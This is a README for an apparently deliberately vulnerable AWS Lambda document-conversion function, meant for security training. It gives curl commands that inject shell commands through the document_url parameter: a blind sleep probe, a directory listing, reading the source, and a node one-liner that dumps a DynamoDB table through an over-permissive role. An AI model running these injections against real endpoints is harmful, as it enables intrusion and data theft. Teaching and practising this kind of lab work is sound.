# Overview
This is a simple Node.js AWS Lambda function that has several vulnerabilities and weaknesses. The function receives a URL to a .doc file as input, and converts it to plain text. The attack process starts by blind probing for a command injection, exploiting the remote command execution vulnerability (through a shell process), and then exploiting the  over-permissive role assigned to the function, in order to grab all the information in the DynamoDB table.

# Installation
1. Clone the repo
2. Make sure you have the Serverless framework installed, and use ```sls deploy``` 
3. Normal execution flow:
 ```curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=www.snee.com/xml/xslt/sample.doc"```
4. Blind probing for remote command execution:
```curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; sleep 10 #"```
5. Exploitation to read the contents of the /var/task directory:
```curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; ls #"```
6. Retrieve the function's source code: 
```curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; cat handler.js #"```
7. Extract all the sensitive data from the DynamoDB table:
```curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();' # "```
